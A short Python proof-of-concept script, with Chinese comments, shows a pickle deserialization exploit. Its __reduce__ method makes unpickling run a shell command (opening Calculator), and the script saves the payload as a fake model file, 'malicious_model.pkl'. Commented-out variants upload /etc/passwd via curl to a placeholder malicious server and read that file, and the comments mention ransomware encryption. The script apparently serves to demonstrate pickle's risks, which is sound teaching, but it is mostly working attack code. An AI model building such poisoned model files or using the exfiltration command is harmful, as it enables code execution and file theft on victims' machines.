import pickle
import os

class Exploit:
    def __reduce__(self):
        # 定义反序列化时要执行的命令
        return (getattr(os, 'system'), ('open -a Calculator',))
		
		# 黑客可以定义任意的入侵代码
		# 例如读取重要文件发送至黑客的远程服务
		# 加密被调用机器的文件，勒索
		# return (os.system('curl -X POST http://恶意服务器/backdoor -F "file=@/etc/passwd" '))
        # return (os.system, ('cat /etc/passwd',))

# 生成恶意序列化数据
malicious_data = pickle.dumps(Exploit())

# 生成恶意 pickle 文件
with open('malicious_model.pkl', 'wb') as f:  # 注意 'wb' 模式
    pickle.dump(Exploit(), f, protocol=pickle.HIGHEST_PROTOCOL)  # 明确指定协议

# 模拟受害者加载（实际攻击中替换为真实场景）
pickle.loads(malicious_data)  # 执行后会弹出计算器
